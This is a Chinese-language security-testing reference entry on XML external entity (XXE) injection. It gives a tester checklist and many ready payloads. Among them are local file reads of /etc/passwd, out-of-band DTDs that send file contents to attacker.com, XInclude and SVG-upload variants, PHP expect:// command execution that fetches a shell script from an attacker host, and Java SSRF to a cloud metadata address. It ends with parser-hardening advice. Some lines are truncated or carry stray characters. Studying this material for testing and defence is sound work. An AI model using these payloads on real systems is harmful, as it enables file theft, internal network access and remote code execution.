# XXE Injection Techniques

**ID**: `web-xxe-001` | **分类**: web | **风险等级**: critical

XML 外部实体 (XXE) 注入利用 XML 解析器对 DTD（文档类型定义）中外部实体的处理机制，读取服务器本地文件、发起服务端请求、执行内网端口扫描等。当 XML 解析器配置为允许处理外部实体时，攻击者通过构造恶意的DTD 引入外部资源，将其内容嵌入XML 文档返回或外带至攻击者服务器。XXE 在现代应用中仍常见于 SOAP API、旧系统、文件解析器（Office、PDF、SVG）等场景

## 触发场景

- 应用接收 XML 格式的请求体（如 SOAP API、XML-RPC、SAML
- 文件上传功能接受 XML 文件（如 SVG、Office 文档、配置文件）
- 应用使用 XML 解析器处理用户提供的数据
- API 支持 Content-Type: application/xml 的请
- 存在 XML 转换功能（XSLT）或 XML 导入功能
- 使用旧版 XML 解析库（libxml2、Xerces、SAX）

## 操作检查清单

1. 确认应用是否接受 XML 格式输入（请求体、文件上传、API 参数
2. 发送基础 XXE 探测 payload（DOCTYPE + ENTITY 声明
3. 根据响应判断是否盲注（无回显）或有回
4. 有回显：尝试 file:// 协议读取本地文件
5. 无回显：构建 OOB XXE 通过 HTTP/DNS 外带数据
6. 测试参数实体注入构造复杂攻击链
7. 测试 XInclude 作为替代注入方式
8. 尝试 PHP expect:// ?Java jar:// 等协议执行命
9. 文件上传场景测试 SVG、Office 文档 XXE
10. 确认 XML 解析器类型并针对性调整 payload

## 技术手段

- 基础 XXE<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
- OOB XXE：通过外部 DTD 引用实现数据外带
- 参数实体<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
- XInclude：利用 XML Include 机制引入外部文件
- Blind XXE 数据外带：将文件内容拼接到 HTTP 请求 URL 
- PHP expect:// 协议：执行系统命
- Java jar:// 协议：访问 JAR 包内文件
- XML Bomb (Billion Laughs)：拒绝服务攻
- SVG XXE：在 SVG 文件中嵌入 XXE payload
- 编码绕过：UTF-16、Base64 编码 DTD 绕过 WAF

## 症状

- XML 请求中的 DOCTYPE 声明未被过滤或禁
- XML 解析错误信息暴露了文件路径或系统信息
- 应用响应中包含被引用的外部文件内
- 服务器向攻击者控制的 URL 发起 HTTP/DNS 请求
- XML 解析耗时异常（可能触发 XML Bomb / Billion Laughs 攻击

## 根因分析

- XML 解析器默认启用外部实体解析（?libxml2 默认允许
- 未禁用 DTD 处理或外部实体加载
- XML 解析器未设置安全属性（?FEATURE_SECURE_PROCESSING
- 应用的 XML 解析结果直接返回给客户端
- 文件上传的 XML 类文件 类文件（SVG、DOCX、XLSX）被直接解析
- XML 转换（XSLT）中未限制文档函数访问

## 示例

### 基础 XXE 文件读取

利用外部实体读取服务器本地文件

```
Payload:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

Windows 变体:
<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">

SOAP API 中的注入:
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header/>
  <soapenv:Body>
    <user>&xxe;</user>
  </soapenv:Body>
</soapenv:Envelope>

原理: 解析器处理 DOCTYPE 中的 ENTITY 声明，将文件内容替换为 &xxe; 实体引用处
```

### OOB XXE 带外数据外带

在Blind XXE 场景下，通过外部 DTD 将文件内容发送到攻击者服务器

```
攻击流程:
1. 攻击者托管 evil.dtd ?http://attacker.com/evil.dtd
2. 发送 XXE payload 引用外部 DTD
3. 外部 DTD 中包含数据外带逻辑
4. 解析器执行 DTD，文件内容被发送到攻击者服务器

?Payload:
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
  %remote;
  %send;
]>
<data>test</data>

evil.dtd 内容:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % send "<!ENTITY &#x25; trick SYSTEM 'http://attacker.com/?data=%file;'>">
%send;

原理: 参数实体 %file 读取文件内容后 send 构造新的参数实体
     将文件内容拼接到 HTTP 请求 URL 参数中发送
注意: 文件内容中的特殊字符可能导致 URL 无效，需编码处理
```

### 参数实体注入复杂攻击

利用参数实体 (%entity;) 在DTD 内部构造多阶段攻击

```
参数实体只能在 DTD 内部使用，但可构造复杂的攻击链

Payload:
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % payload "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  %payload;
  %exfil;
]>
<data/>  

绕过过滤:
如果 SYSTEM 关键字被过滤:
<!ENTITY % dtd SYSTEM "http://attacker.com/payload.dtd">
%dtd;

?payload.dtd 中写入实际攻击 payload，绕过对 SYSTEM/ENTITY 的检测

原理: 参数实体在 DTD 解析阶段被处理，可用于动态构造其他实体
     参数实体引用 %entity; 只能在 DTD 子集中使用
```

### XInclude 攻击

当DOCTYPE 被过滤时，使用XInclude 机制引入外部文件

```
XInclude ?XML 标准的一部分，用于包含外部 XML 文档:

Payload:
<?xml version="1.0"?>
<data xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</data>

读取 Java 资源:
<xi:include href="http://attacker.com/malicious.xml" parse="xml"/>

原理: XInclude 不需要 DOCTYPE 声明，绕过对 DOCTYPE 的过滤
     某些 XML 解析器在处理 XInclude 时不应用 XXE 防护
     parse="text" 将文件作为纯文本包含，parse="xml" 作为 XML 解析

适用: Java (Xerces)、PHP (libxml) 和 NET 等支持 XInclude 的解析器
注意: 需要在 XML 中声明 XInclude 命名空间
```

### SVG 文件上传 XXE

通过上传包含 XXE payload 的SVG 文件利用文件上传入口

```
SVG 本质是 XML 格式，可直接嵌入 XXE payload:

evil.svg:
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">&xxe;</text>
</svg>

OOB 变体:
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
  %remote;
  %send;
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <image xlink:href="data:image/png;base64,placeholder"/>
</svg>

原理: 图像处理库或浏览器解析 SVG 时处理其中的 DTD
     很多应用只检查 SVG 文件扩展名或 MIME 类型，不检查内容
适用: 任何接受 SVG 上传并解析的应用
```

### PHP expect:// 命令执行

利用 PHP ?expect:// 协议通过 XXE 执行系统命令

```
前提: PHP 安装的 expect 扩展（非默认安装）

Payload:
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<data>&xxe;</data>

复杂命令:
<!ENTITY xxe SYSTEM "expect://cat /etc/passwd">
<!ENTITY xxe SYSTEM "expect://wget http://attacker.com/shell.sh -O /tmp/shell.sh">

PHP 其他协议:
php://filter/read=convert.base64-encode/resource=/etc/passwd
php://input (配合 POST body 数据)

原理: expect:// 协议将 URI 部分作为系统命令执行
     返回命令输出作为实体值
适用: PHP + expect 扩展安装的环境
```

### Java XXE 多协议利

利用 Java XML 解析器的多种协议实现文件读取和SSRF

```
Java 支持的协议:
1. file:// - 读取本地文件
2. http:// - 发起 HTTP 请求 (SSRF)
3. jar:// - 访问 JAR 包内文件
4. netdoc:// - JDK 内部协议，列出目录

文件读取:
<!ENTITY xxe SYSTEM "file:///etc/passwd">

SSRF:
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">

JAR 协议:
<!ENTITY xxe SYSTEM "jar:http://attacker.com/malicious.jar!/config.xml">

Java 防护配置 (常被遗漏):
factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setExpandEntityReferences(false);

原理: 需要同时禁用多个特性才能完全防止 XXE
     许多应用只配置部分特性，留下攻击面
```

## 成功标志

- 成功读取本地文件并在响应中返回（有回显 XXE
- 成功通过 OOB XXE 外带文件内容到攻击者服务器
- 确认目标存在 XXE 漏洞（通过带外请求验证
- XXE 结合 SSRF 访问内网服务
- 通过 expect:// 等协议执行系统命令

## 防御建议

- 禁用 DTD 处理：设置解析器特性 disallow-doctype-decl=true
- 禁用外部实体：external-general-entities=false, external-parameter-entities=false
- 启用 FEATURE_SECURE_PROCESSING 限制实体扩展
- 使用 JSON 替代 XML 作为数据交换格式
- 对用户提供的 XML 进行 Schema 验证，拒绝包含 DOCTYPE 的文档
- 使用白名单验证 XML 结构和元素
- 更新 XML 解析库到最新版本（libxml2 2.9.0+ 默认禁用外部实体。但可手动开启
